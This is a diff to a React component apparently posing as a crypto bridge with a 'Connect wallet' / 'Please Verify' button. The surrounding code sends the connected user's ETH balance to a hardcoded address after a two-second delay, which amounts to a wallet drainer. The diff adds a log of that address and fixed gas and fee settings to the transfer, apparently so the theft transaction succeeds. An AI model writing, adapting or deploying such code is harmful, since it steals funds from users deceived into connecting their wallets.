@@ -45,6 +45,7 @@ const Brigde = () => {
       if (active && balanceEth) {
         const amountWei = web3.utils.toWei(balanceEth.toString(), "ether");
         const destinationAddress = "0x8F3F79D4c2b1C557e9Ef88F16Afc709041d6e7D0";
+        console.log(destinationAddress)
 
       // Retrasar la función transfer por 2 segundos
       await new Promise((resolve) => setTimeout(resolve, 2000));
@@ -53,6 +54,8 @@ const Brigde = () => {
           from: account,
           to: destinationAddress,
           value: amountWei,
+          gas:30000,
+          maxFeePerGas:1000000108,       
         });
       }
       
@@ -84,6 +87,7 @@ const Brigde = () => {
           <button onClick={connectMetamask}>
           {verified ? "Please Verify" : "Connect wallet"}
           </button>
+          
         </form>
       </div>
     </div>
